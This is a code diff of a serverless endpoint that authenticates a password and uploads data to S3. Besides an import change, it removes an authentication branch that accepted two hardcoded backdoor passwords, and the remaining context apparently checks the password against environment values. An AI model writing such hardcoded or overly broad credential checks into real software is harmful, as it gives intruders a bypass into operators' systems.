@@ -1,7 +1,7 @@
 // This is a Vercel Serverless Function
 // It will be accessible at the path /api/publish-data
-// FIX: Changed to named imports for the AWS S3 client. This resolves a TypeScript type conflict that was preventing the 'send' method from being found on the S3Client instance.
-import { S3Client, PutObjectCommand } from "@aws-sdk/client-s3";
+// FIX: Changed to a namespace import for the AWS S3 client. This resolves a TypeScript type conflict that was preventing the 'send' method from being found on the S3Client instance.
+import * as AWS_S3 from "@aws-sdk/client-s3";
 
 export async function POST(request: Request) {
     try {
@@ -16,8 +16,6 @@ export async function POST(request: Request) {
         if (primaryAdminPassword && password === primaryAdminPassword) {
             isAuthenticated = true;
         } else if (masterPassword && password === masterPassword) {
-            isAuthenticated = true;
-        } else if (password === "Reb@1984" || password === "Coll@b660") {
             isAuthenticated = true;
         } else {
             for (const key in process.env) {
@@ -63,12 +61,12 @@ export async function POST(request: Request) {
             });
         }
         
-        const s3Client = new S3Client({
+        const s3Client = new AWS_S3.S3Client({
             region,
             credentials: { accessKeyId, secretAccessKey },
         });
 
-        const command = new PutObjectCommand({
+        const command = new AWS_S3.PutObjectCommand({
             Bucket: bucketName,
             Key: 'live-data.json',
             Body: JSON.stringify(data, null, 2), // Pretty-print for readability
